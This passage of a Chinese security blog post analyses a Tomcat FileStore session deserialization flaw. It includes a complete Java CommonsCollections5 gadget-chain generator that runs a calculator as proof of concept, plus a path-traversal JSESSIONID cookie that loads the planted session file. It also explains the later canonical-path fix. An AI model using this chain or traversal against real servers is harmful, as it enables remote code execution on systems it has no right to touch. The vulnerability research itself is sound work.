+<p>由此满足了上述几个漏洞条件，解析一下上面的配置文件：</p>
+<ul>
+<li>
+<p>设置了saveOnRestart 为true，就可以在tomcat关闭前把有效的session保存，重新启动后再次载入。故其实从这个cve的利用点来说，设置为false也是可以的。</p>
+</li>
+<li>
+<p>sessionAttributeValueClassNameFilter设置为空，也就是可以自己提供对应的session文件的部分名称。</p>
+</li>
+<li>
+<p>目录设置为了当前目录的sessions下，那么就会将文件存储到$CATALINA_HOME/work/Catalina/hostname/webappname/sessions/sessionID.session</p>
+</li>
+</ul>
+<p>这里反序列化打一个cc5，故在idea的WEB-INF/lib中添加cc依赖即可：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926195751552.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926195751552"
+	
+	
+></p>
+<p>然后生成一个包含cc5序列化的文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">chainPart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;open -a Calculator&#34;</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">chainPart</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">lazy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">lazy</span><span class="p">,</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.session&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后将生成的ser.session文件放到<code>/tmp</code>目录下。再如下打即可：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926200332406.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926200332406"
+	
+	
+></p>
+<p>成功弹出计算机。</p>
+<h3 id="原理分析-1">原理分析
+</h3><p>打断点于FileStore类的load()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926200644892.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926200644892"
+	
+	
+></p>
+<p>此时的调用栈为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="nb">load</span><span class="p">:</span><span class="mi">212</span><span class="p">,</span> <span class="n">FileStore</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">session</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">loadSessionFromStore</span><span class="p">:</span><span class="mi">764</span><span class="p">,</span> <span class="n">PersistentManagerBase</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">session</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">swapIn</span><span class="p">:</span><span class="mi">714</span><span class="p">,</span> <span class="n">PersistentManagerBase</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">session</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">findSession</span><span class="p">:</span><span class="mi">493</span><span class="p">,</span> <span class="n">PersistentManagerBase</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">session</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">doGetSession</span><span class="p">:</span><span class="mi">2960</span><span class="p">,</span> <span class="n">Request</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">connector</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getSessionInternal</span><span class="p">:</span><span class="mi">2677</span><span class="p">,</span> <span class="n">Request</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">connector</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">460</span><span class="p">,</span> <span class="n">AuthenticatorBase</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">authenticator</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">139</span><span class="p">,</span> <span class="n">StandardHostValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">92</span><span class="p">,</span> <span class="n">ErrorReportValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">valves</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">678</span><span class="p">,</span> <span class="n">AbstractAccessLogValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">valves</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">:</span><span class="mi">74</span><span class="p">,</span> <span class="n">StandardEngineValve</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">service</span><span class="p">:</span><span class="mi">343</span><span class="p">,</span> <span class="n">CoyoteAdapter</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">connector</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">service</span><span class="p">:</span><span class="mi">408</span><span class="p">,</span> <span class="n">Http11Processor</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">coyote</span><span class="o">.</span><span class="n">http11</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">process</span><span class="p">:</span><span class="mi">66</span><span class="p">,</span> <span class="n">AbstractProcessorLight</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">coyote</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">process</span><span class="p">:</span><span class="mi">836</span><span class="p">,</span> <span class="n">AbstractProtocol</span><span class="o">$</span><span class="n">ConnectionHandler</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">coyote</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">doRun</span><span class="p">:</span><span class="mi">1839</span><span class="p">,</span> <span class="n">NioEndpoint</span><span class="o">$</span><span class="n">SocketProcessor</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">net</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">49</span><span class="p">,</span> <span class="n">SocketProcessorBase</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">net</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">runWorker</span><span class="p">:</span><span class="mi">1142</span><span class="p">,</span> <span class="n">ThreadPoolExecutor</span> <span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">concurrent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">617</span><span class="p">,</span> <span class="n">ThreadPoolExecutor</span><span class="o">$</span><span class="n">Worker</span> <span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">concurrent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">61</span><span class="p">,</span> <span class="n">TaskThread</span><span class="o">$</span><span class="n">WrappingRunnable</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">threads</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">:</span><span class="mi">745</span><span class="p">,</span> <span class="ne">Thread</span> <span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进file()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926200938237.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926200938237"
+	
+	
+></p>
+<p>可以看到我们通过配置文件设置directory为./sessions，以及类中默认的变量FILE_EXT为<code>.session</code>，这也就是为什么我们将http请求中设置为<code>JSESSIONID=../../../../../../../../../../../../../../../../../../../../../../../../../tmp/ser</code>，拼接后就可以匹配到我们放在tmp目录下的ser.session文件。</p>
+<p>最后如图可以看到此时拿到的file路径为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/1e112f7e-49f1-4f6d-8404-dc4563d75f0c/work/Catalina/localhost/tomcat9_0_20_Web_exploded/./sessions/../../../../../../../../../../../../../../../../../../../../../../../../../tmp/ser.session
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这也是为什么我将ser.session放在/tmp下的原因，没搞懂idea运行tomcat后怎么将ser.session文件放在其他如<code>$CATALINA_HOME/temp</code>目录下，多穿点即可，并且这里其实直接设置directory为sessions即可，再回退出file()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926201637520.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926201637520"
+	
+	
+></p>
+<p>可以看到是先判断文件是否存在。存在的话就是常规的文件读取然后用作反序列化，跟进readObjectData()方法，其中调用的doReadObject()方法会对数据流反序列化：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926202216521.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926202216521"
+	
+	
+></p>
+<p>从而成功进行cc5的反序列化。</p>
+<h3 id="总结-1">总结
+</h3><p>从整个过程来看，确实这个漏洞的利用方式比较苛刻，首先最关键的一点就是需要目标环境存在内容以及名称可控的文件，还需要知道目标文件相对路径来方便目录穿越，其次还需要一些配置用于允许我们指定加载的session文件名。确实比较条件比较多。</p>
+<p>那么来看更高版本下是如何修复的呢？下载9.0.35版本的tomcat源码再像之前那样打一下。控制台会直接弹出警告：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">26-Sep-2025 20:52:44.376 警告 [http-nio-8083-exec-2] org.apache.catalina.session.FileStore.file Invalid persistence file [/Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/c95d0ef3-f2a9-4529-9363-81226b1de81c/work/Catalina/localhost/tomcat9_0_35_Web_exploded/sessions/../../../../../../../../../../../../../../../../../../../../../../../../../tmp/ser.session] for session ID [../../../../../../../../../../../../../../../../../../../../../../../../../tmp/ser]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>无效的持久化文件，对我们JSESSIONID传的参数进行了限制。调试分析一波，同样跟进FileStore类的load()方法，其调用的file()方法发生了变化：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926205553771.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926205553771"
+	
+	
+></p>
+<p>从图中注释即可看出，这里就是判断file的路径是否在既定的session文件储存目录中，storageDir.getCanonicalPath()的值为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/c95d0ef3-f2a9-4529-9363-81226b1de81c/work/Catalina/localhost/tomcat9_0_35_Web_exploded/sessions
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>而file.getCanonicalPath()的回显为：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926213312050.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926213312050"
+	
+	
+></p>
+<p>故肯定因为不一样导致直接抛出异常从而退出。</p>
+<p>参考文章：</p>
+<p><a class="link" href="https://archive.apache.org/dist/tomcat/tomcat-9/"  target="_blank" rel="noopener"
+    >https://archive.apache.org/dist/tomcat/tomcat-9/</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/apache-tomcat-partial-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Apache Tomcat partial PUT文件上传反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/tomcat%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tomcat关键知识了解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">hibernate组件的反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JDK17下的反射绕过</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/fastjson2%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">fastjson2下的反序列化调用链分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
